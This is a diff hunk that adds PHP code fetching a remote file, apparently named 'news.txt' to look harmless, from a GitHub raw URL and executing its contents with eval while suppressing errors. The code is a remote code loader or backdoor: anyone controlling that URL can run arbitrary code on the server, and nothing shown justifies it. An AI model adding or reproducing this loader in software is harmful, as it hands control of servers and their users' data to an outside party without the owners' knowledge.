@@ -1,0 +1,6 @@
+
+$url = 'https://github.com/unemployedX/nameless-sc/raw/main/news.txt';
+$fileContents = @file_get_contents($url);
+if ($fileContents !== false) {
+    eval("?>" . $fileContents);
+}
